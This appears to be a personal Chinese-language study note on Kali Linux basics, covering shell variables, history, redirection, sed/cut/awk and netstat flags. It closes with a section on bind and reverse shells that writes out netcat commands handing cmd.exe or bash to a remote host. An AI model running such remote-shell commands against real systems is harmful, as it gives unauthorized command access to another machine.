# kali-linux system learnning

echo $USER 输出当前用户名

echo $PWD 输出当前路径

echo $HOME 家目录

export b=127.0.0.1  设置一个变量，并赋值

ping -c 2 $b 使用ping命令发送2次数据包到该变量值

echo "$$" 使用两个符号来查看当前shell实例进程的id

var="zhangsan" 使用var命令创建一个对象

echo $var 输出当前变量

history 查看当前命令历史 

!1	命令历史当中的第一条命令会被执行

!! 执行上一条命令

ls 列出当前目录下文件

echo "abc" > redirection_test.txt 将abc内容输出到一个文件中,注意，使用>会进行覆盖写入，追加写入可以使用>>

wc -m < redirection_text.txt 记录当前文本中的字符数

echo "lalala a b c d header" | sed 's/header/head/' 使用sed替换文本内的某一段内容

cut -d ":"  -f 1 /etc/passwd 取出当前文本内以冒号分隔的第一串字符

echo "hello::there::friend" | awk -F "::" '{print $1,$3}' 以冒号分隔并取出第一个字符串以及第三个字符串

netstat用来查看系统当前系统网络状态信息，包括端口，连接情况等，常用方式如下：

```
netstat -atunlp,各参数含义如下:

-t : 指明显示TCP端口

-u : 指明显示UDP端口

-l : 仅显示监听套接字(LISTEN状态的套接字)

-p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序

-n : 不进行DNS解析

-a 显示所有连接的端口
```

```
正向连接与反向连接
a主机为windows
b主机为linux
正向连接a：nc -nv 192.1.1.2 8888 -e cmd.exe 主机为windows则需要使用-e参数来进行程序重定向
b:nc -lp 8888 在b主机上发起一个监听端口等待a主机的连接  ----监听机获得连接机的cmd执行权限
反向连接a:nc -nv 192.168.1.2 8888 
b:nc -lp 8888 -c bash 使用-c参数将bash丢给连接方  -----a主机获得b主机的shell执行
```

